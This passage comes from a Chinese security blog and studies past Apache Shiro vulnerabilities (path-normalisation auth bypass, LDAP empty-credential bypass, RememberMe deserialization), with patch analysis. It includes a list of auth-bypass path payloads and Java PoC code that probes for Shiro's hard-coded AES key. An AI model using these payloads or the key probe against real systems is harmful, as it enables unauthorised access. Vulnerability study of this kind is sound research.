class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="数据库解析"><a href="#数据库解析" class="headerlink" title="数据库解析"></a>数据库解析</h3><p>有了数据库之后，我们要在VSCode插件商店中搜索codeql，安装插件，然后配置codeql引擎的路径，到此安装完毕</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209081121988.png" alt="image-20220908112132672"></p>
<p>在所下载的codeql插件中，点击<code>Choose Database from Archive</code>，选择上述生成的database导入。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209081200414.png" alt="image-20220908120036218"></p>
<p>选择好数据库之后，用VSCode打开前面下载的<code>SDK</code>，在ql&#x2F;java&#x2F;ql&#x2F;examples文件夹下新建一个demo.ql，这里测试输出”hello world”。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209081210382.png" alt="image-20220908121008190"></p>
]]></content>
      <categories>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro历史漏洞学习</title>
    <url>/2022/09/26/shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近整理了一些权限绕过的payload，所以就过一下shiro的历史漏洞。</p>
<span id="more"></span>

<h3 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h3><h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863">CVE-2010-3863</a> &#x2F; <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2010-2715">CNVD-2010-2715</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro &lt; 1.1.0 &amp; JSecurity 0.9.x</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">Shiro 在对请求路径与 shiro.ini 配置文件配置的 AntPath 进行对比前 未进行路径标准化，导致使用时可能绕过权限校验</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">&#x2F;.&#x2F; | 路径标准化</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">Commit-ab82949</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL">https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL</a> <a href="https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2">https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2</a></td>
</tr>
</tbody></table>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>环境的搭建采用的这个作者的</p>
<p><a href="https://blog.csdn.net/Xxy605/article/details/125404334">https://blog.csdn.net/Xxy605/article/details/125404334</a></p>
<p>搭建好后，直接访问secret.html是需要权限校验的，权限不通过就会跳转到登录</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261151851.png" alt="image-20220926115157770"></p>
<p>在路径中添加特殊字符即可绕过权限校验</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261153989.png" alt="image-20220926115335873"></p>
<p>当然不止这个字符，这里直接用上我的权限绕过字典</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261205560.png" alt="image-20220926120513350"></p>
<p>跑出的结果整理出来大致有如下payload可以绕过（当然可能还要其他的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">.</span><br><span class="line">a.ico/../</span><br><span class="line">%2e</span><br><span class="line">%3b/%2e.</span><br><span class="line">%3b/..</span><br><span class="line">js/..;/</span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>Shiro 使用 <code>PathMatchingFilterChainResolver#getChain</code> 方法获取和调用要执行的过滤器</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261421084.png" alt="image-20220926142145921"></p>
<p>然后进入else语句通过<code>PathMatchingFilterChainResolver#getPathWithinApplication</code>获取<code>requestURI</code>，跟进</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261432397.png" alt="image-20220926143206319"></p>
<p>继续跟进，如下调用<code>WebUtils#getRequestUri</code>处理<code>request</code>获取<code>requestUri</code>，然后使用字符串截取的方式，去掉URI中的contextPath，跟进<code>getRequestUri</code>这个函数</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261434159.png" alt="image-20220926143413096"></p>
<p>将获取的uri传递到<code>WebUtils#decodeAndCleanUriString</code>中</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261436435.png" alt="image-20220926143602338"></p>
<p>整个方法就是去除URI中的“;”</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261446899.png" alt="image-20220926144625832"></p>
<p><code>decodeRequestString</code>做了url解码操作</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261438656.png" alt="image-20220926143810483"></p>
<p>返回URI路径之后，然后循环配置中的AntPath，判断URI和配置路径是否匹配</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261439537.png" alt="image-20220926143915441"></p>
<p>然后将处理之后的URI传入<code>AntPathMatcher#doMatch</code>进行匹配，在上面的处理期间未做路径标准化处理，导致URI中如果存在一些特殊字符，就有可能导致权限绕过。</p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>查看补丁链接 <a href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">Commit-ab82949</a>，在补丁中新增了<code>normalize</code>方法来对路径进行标准化处理</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261452874.png" alt="image-20220926145256733"></p>
<p><code>normalize</code>方法大致如下，可以看到对URI中的 <code>\\</code>、<code>//</code>、<code>/./</code>、<code>/../</code>进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">normalize</span><span class="params">(String path, <span class="type">boolean</span> replaceBackSlash)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a place for the normalized path</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">normalized</span> <span class="operator">=</span> path;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (replaceBackSlash &amp;&amp; normalized.indexOf(<span class="string">&#x27;\\&#x27;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">            normalized = normalized.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (normalized.equals(<span class="string">&quot;/.&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add a leading &quot;/&quot; if necessary</span></span><br><span class="line">        <span class="keyword">if</span> (!normalized.startsWith(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">            normalized = <span class="string">&quot;/&quot;</span> + normalized;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Resolve occurrences of &quot;//&quot; in the normalized path</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> normalized.indexOf(<span class="string">&quot;//&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            normalized = normalized.substring(<span class="number">0</span>, index) +</span><br><span class="line">                normalized.substring(index + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Resolve occurrences of &quot;/./&quot; in the normalized path</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> normalized.indexOf(<span class="string">&quot;/./&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            normalized = normalized.substring(<span class="number">0</span>, index) +</span><br><span class="line">                normalized.substring(index + <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Resolve occurrences of &quot;/../&quot; in the normalized path</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> normalized.indexOf(<span class="string">&quot;/../&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> (<span class="literal">null</span>);  <span class="comment">// Trying to go outside our context</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index2</span> <span class="operator">=</span> normalized.lastIndexOf(<span class="string">&#x27;/&#x27;</span>, index - <span class="number">1</span>);</span><br><span class="line">            normalized = normalized.substring(<span class="number">0</span>, index2) +</span><br><span class="line">                normalized.substring(index + <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return the normalized path that we have completed</span></span><br><span class="line">        <span class="keyword">return</span> (normalized);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2014-0074"><a href="#CVE-2014-0074" class="headerlink" title="CVE-2014-0074"></a>CVE-2014-0074</h3><h4 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2014-0074</a> &#x2F; <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2014-03861">CNVD-2014-03861</a> &#x2F; <a href="https://issues.apache.org/jira/browse/SHIRO-460">SHIRO-460</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro 1.x &lt; 1.2.3</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">当程序使用LDAP服务器并启用非身份验证绑定时，远程攻击者可借助空的用户名或密码利用该漏洞绕过身份验证。</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">ldap | 绕过 | 空密码 | 空用户名 | 匿名</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/f988846207f98c98ff24213ee9063798ea5d9b6c">Commit-f988846</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://stackoverflow.com/questions/21391572/shiro-authenticates-non-existent-user-in-ldap">https://stackoverflow.com/questions/21391572/shiro-authenticates...in-ldap</a> <a href="https://www.openldap.org/doc/admin24/security.html">https://www.openldap.org/doc/admin24/security.html</a></td>
</tr>
</tbody></table>
<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>暂无相关环境。</p>
<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>根据官方通告是 ldap 服务器在开启了 unauthenticated bind 之后会受到影响；利用的场景有两种：</p>
<ul>
<li>ldap unauthenticated bind enabled 的情况下，可以使用空用户名+任意密码进行认证。</li>
<li>ldap allow anonymous 的情况下，可以空用户名+空密码的匿名访问进行认证。</li>
</ul>
<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>查看补丁链接 <a href="https://github.com/apache/shiro/commit/f988846207f98c98ff24213ee9063798ea5d9b6c">f988846</a>，补丁中添加了<code>validateAuthenticationInfo</code>方法来针对这个漏洞进行修复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Validates the configuration in the JNDI &lt;code&gt;environment&lt;/code&gt; settings and throws an exception if a problem</span></span><br><span class="line"><span class="comment">     * exists.</span></span><br><span class="line"><span class="comment">     * &lt;p/&gt;</span></span><br><span class="line"><span class="comment">     * This implementation will throw a &#123;<span class="doctag">@link</span> AuthenticationException&#125; if the authentication mechanism is set to</span></span><br><span class="line"><span class="comment">     * &#x27;simple&#x27;, the principal is non-empty, and the credentials are empty (as per</span></span><br><span class="line"><span class="comment">     * &lt;a href=&quot;http://tools.ietf.org/html/rfc4513#section-5.1.2&quot;&gt;rfc4513 section-5.1.2&lt;/a&gt;).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> environment the JNDI environment settings to be validated</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> AuthenticationException if a configuration problem is detected</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validateAuthenticationInfo</span><span class="params">(Hashtable&lt;String, Object&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> AuthenticationException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// validate when using Simple auth both principal and credentials are set</span></span><br><span class="line">        <span class="keyword">if</span>(SIMPLE_AUTHENTICATION_MECHANISM_NAME.equals(environment.get(Context.SECURITY_AUTHENTICATION))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// only validate credentials if we have a non-empty principal</span></span><br><span class="line">            <span class="keyword">if</span>( environment.get(Context.SECURITY_PRINCIPAL) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                StringUtils.hasText( String.valueOf( environment.get(Context.SECURITY_PRINCIPAL) ))) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">Object</span> <span class="variable">credentials</span> <span class="operator">=</span> environment.get(Context.SECURITY_CREDENTIALS);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// from the FAQ, we need to check for empty credentials:</span></span><br><span class="line">                <span class="comment">// http://docs.oracle.com/javase/tutorial/jndi/ldap/faq.html</span></span><br><span class="line">                <span class="keyword">if</span>( credentials == <span class="literal">null</span> ||</span><br><span class="line">                    (credentials <span class="keyword">instanceof</span> <span class="type">byte</span>[] &amp;&amp; ((<span class="type">byte</span>[])credentials).length &lt;= <span class="number">0</span>) || <span class="comment">// empty byte[]</span></span><br><span class="line">                    (credentials <span class="keyword">instanceof</span> <span class="type">char</span>[] &amp;&amp; ((<span class="type">char</span>[])credentials).length &lt;= <span class="number">0</span>) || <span class="comment">// empty char[]</span></span><br><span class="line">                    (String.class.isInstance(credentials) &amp;&amp; !StringUtils.hasText(String.valueOf(credentials)))) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">javax</span>.naming.AuthenticationException(<span class="string">&quot;LDAP Simple authentication requires both a &quot;</span></span><br><span class="line">                                                                       + <span class="string">&quot;principal and credentials.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2016-4437"><a href="#CVE-2016-4437" class="headerlink" title="CVE-2016-4437"></a>CVE-2016-4437</h3><h4 id="漏洞信息-2"><a href="#漏洞信息-2" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2016-4437</a> &#x2F; <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-03869">CNVD-2016-03869</a> &#x2F; <a href="https://issues.apache.org/jira/browse/SHIRO-550">SHIRO-550</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro 1.x &lt; 1.2.5</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">如果程序未能正确配置 “remember me” 功能使用的密钥。 攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">cookie | RememberMe | 反序列化 | 硬编码 | AES</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://issues.apache.org/jira/browse/SHIRO-441">SHIRO-441</a> <a href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></td>
</tr>
</tbody></table>
<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>环境是在CVE-2010-3863基础上修改的，搭建好后，访问登录页面</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261708084.png" alt="image-20220926170814849"></p>
<p>随便输入用户名密码抓取数据包，在响应包中看到<code>remeberMe=deleteMe</code>即可判断出存在shiro框架</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261709878.png" alt="image-20220926170938700"></p>
<p>使用工具进行漏洞探测和漏洞利用，工具地址：<a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261710343.png" alt="image-20220926171048126"></p>
<p>可以看到存在CB链，但其实本项目在搭建的时候并没有引入其他的依赖，这里就是shiro自带的一条CB链了，后面再分析。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261714727.png" alt="image-20220926171409484"></p>
<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>shiro提供了RememberMe的功能，在应用中提供了记住用户登陆状态的功能。在分析漏洞之前需要了解几个关键的类。</p>
<p><strong>RememberMeManager</strong></p>
<p>接口 <code>org.apache.shiro.mgt.RememberMeManager</code>提供了 5 个方法：</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261719082.png" alt="image-20220926171920930"></p>
<p><strong>AbstractRememberMeManager</strong></p>
<p>实现了 <code>RememberMeManager</code> 接口的抽象类 <code>AbstractRememberMeManager</code>，其中有几个重要的成员变量：</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261726949.png" alt="image-20220926172645839"></p>
<ul>
<li><code>DEFAULT_CIPHER_KEY_BYTES</code>：一个 Base64 硬编码的 AES Key，也是本次漏洞的关键点，在进行AES加解密时都需要该key。</li>
<li><code>serializer</code>：Shiro 提供的序列化器，用来对PrincipalCollection 对象进行序列化和反序列化 。</li>
<li><code>cipherService</code>：用来对数据加解密的类，实际上是 <code>org.apache.shiro.crypto.AesCipherService</code> 类，加解密使用的key即为 DEFAULT_CIPHER_KEY_BYTES。</li>
</ul>
<p>看下该类的构造方法</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261730801.png" alt="image-20220926173040672"></p>
<p>构造方法对<code>serializer</code>采用<code>DefaultSerializer</code>进行初始化，并设置<code>DEFAULT_CIPHER_KEY_BYTES</code> 作为 AES 加解密的 key。</p>
<p><strong>CookieRememberMeManager</strong></p>
<p>Shiro 还提供了一个实现了 <code>RememberMeManager</code> 接口的实现类 <code>CookieRememberMeManager</code>，该类的位置在<code>shiro-web-1.2.4.jar!\org\apache\shiro\web\mgt\CookieRememberMeManager.class</code>中，主要的作用是实现了使用cookie记录用户信息的相关功能，其中有一个方法<code>getRememberedSerializedIdentity</code>主要的作用就是获取cookie值，并将其进行Base64 解码返回 byte 数组。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261745490.png" alt="image-20220926174539346"></p>
<p>在该函数上打上断点，可以看到调用栈如下，在Filter处理流程中，会调用 <code>AbstractShiroFilter#doFilterInternal</code> 方法，然后使用<code>SecurityManager</code>去创建Subject对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getRememberedSerializedIdentity:<span class="number">187</span>, CookieRememberMeManager (org.apache.shiro.web.mgt)</span><br><span class="line">getRememberedPrincipals:<span class="number">393</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:<span class="number">604</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:<span class="number">492</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:<span class="number">342</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">buildSubject:<span class="number">846</span>, Subject$Builder (org.apache.shiro.subject)</span><br><span class="line">buildWebSubject:<span class="number">148</span>, WebSubject$Builder (org.apache.shiro.web.subject)</span><br><span class="line">createSubject:<span class="number">292</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:<span class="number">359</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>

<p>然后通过<code>DefaultSecurityManager#resolvePrincipals</code> 方法来将subjectContext转换为PrincipalCollection，在<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code>中可以看到这里调用了两个方法，一个<code>getRememberedSerializedIdentity</code>就是之前下断点的地方，该方法的作用就是获取Cookie并base64解码，然后返回一个byte数组，并将byte数组传递到第二个方法<code>convertBytesToPrincipals</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209270950467.png" alt="image-20220927095004375"></p>
<p>看一下<code>convertBytesToPrincipals</code>方法的具体实现，这个方法中调用了两个方法，一个<code>decrype</code>，一个<code>deserialize</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271015178.png" alt="image-20220927101555033"></p>
<p>在<code>decrype</code>方法中可以看到将会使用<code>decryptionCipherKey</code>进行解密</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271017383.png" alt="image-20220927101727302"></p>
<p>在构造方法中调用<code>setCipherKey</code>用<code>DEFAULT_CIPHER_KEY_BYTES</code>对<code>encryptionCipherKey</code>和<code>decryptionCipherKey</code>进行赋值</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271022629.png" alt="image-20220927102241391"></p>
<p>解密完之后回到第二个方法<code>deserialize</code>，跟进通过<code>getSerializer</code>方法获取序列化器，序列化器的默认实现是 <code>DefaultSerializer</code>，也就是这里会调用<code>DefaultSerializer#deserialize</code>方法去对byte数组进行处理</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271031053.png" alt="image-20220927103105922"></p>
<p>在<code>DefaultSerializer#deserialize</code>方法中，会调用<code>ByteArrayInputStream</code> 将 byte 转为 <code>ObjectInputStream</code>，然后通过Java原生的反序列化对其进行反序列化 </p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271036505.png" alt="image-20220927103646343"></p>
<p>反序列化结束后返回<code>PrincipalCollection</code>对象，并将其 set 到 <code>SubjectContext</code> 中</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271039700.png" alt="image-20220927103936545"></p>
<p>根据上面反序列化的流程，攻击者就可以构造恶意的反序列化数据，然后使用硬编码的AES密钥进行加密，最后Base64编码放在cookie中发包即可。</p>
<p>编写poc测试脚本</p>
<p>首先是key检测的代码，这个检测的方法相较于其他方式较好，生成的rememberMe很短</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.SimplePrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shiroKey_check</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test01</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">SimplePrincipalCollection</span> <span class="variable">simplePrincipalCollection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimplePrincipalCollection</span>();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(simplePrincipalCollection);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(barr.toByteArray())));</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.println(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>检测的原理是：将<code>SimplePrincipalCollection</code>对象进行序列化并AES加密+Base64编码构造cookie发包，可以在<code>AbstractRememberMeManager#getRememberedPrincipals</code>中看到，这个方法有个try catch语句，try代码块就是上面说的对cookie进行解密然后反序列化，而catch则是在反序列化时如果出现异常则会执行<code>AbstractRememberMeManager#onRememberedPrincipalFailure</code>方法</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271533521.png" alt="image-20220927153324403"></p>
<p>一直跟下来就会到<code>SimpleCookie#removeFrom</code>方法，该方法就是在请求头中添加deleteMe的值</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271539949.png" alt="image-20220927153953878"></p>
<blockquote>
<p>那么这里就有一个方法能够来验证密钥是否为正确，在<code>getRememberedPrincipals</code>这个方法中，如果在密钥正确并且反序列化成功且返回的是PrincipalCollection对象的话，那么就不会触发异常，也就是不会带上<code>deleteMe</code>的包，所以需要找一个<code>PrincipalCollection</code>类来进行序列化发送</p>
</blockquote>
<p>因此可以寻找一个<code>PrincipalCollection</code>的实现类来进行构造，如下<code>SimplePrincipalCollection</code>就很适合</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271545692.png" alt="image-20220927154546603"></p>
<p>在密钥不正确的情况下返回包如下</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271547360.png" alt="image-20220927154740204"></p>
<p>在密钥正确的情况下返回：</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271548723.png" alt="image-20220927154857518"></p>
<p>具体细节可以参考：</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect</a></p>
<p>在探测出密钥之后，我们需要配合<code>ysoserial</code>工具进行漏洞利用，编写exp.py如下，将<code>ysoserial</code>工具放在exp.py同目录下</p>
